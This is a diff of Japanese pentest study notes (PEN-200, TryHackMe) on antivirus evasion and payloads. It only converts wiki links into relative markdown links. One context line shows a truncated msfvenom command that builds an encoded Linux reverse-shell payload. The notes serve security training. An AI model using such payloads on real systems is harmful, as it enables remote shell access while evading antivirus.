@@ -1,5 +1,5 @@
 - 関連ノート：
-	- [[Module 16：Antivirus Evasion#Veil-frameworkを使ったAV evasion]]
+	- [Module 16：Antivirus Evasion](../PEN-200/Module%2016：Antivirus%20Evasion.md#Veil-frameworkを使ったAV%20evasion)
 
 ---
 
@@ -60,7 +60,7 @@ sudo msfvenom -p linux/x86/shell/reverse_tcp -f c -e x86/shikata_ga_nai -o shell
 
 # ペイロードについて
 
-- [[5. AV Evasion：Shellcode#Staged / Stageless Payloads]]
+- [5. AV Evasion：Shellcode](../TryHackME/Red%20Teaming/4.%20Host%20Evasions/5.%20AV%20Evasion：Shellcode.md#Staged%20/%20Stageless%20Payloads)
 
 ペイロードの命名規則
 ```zsh
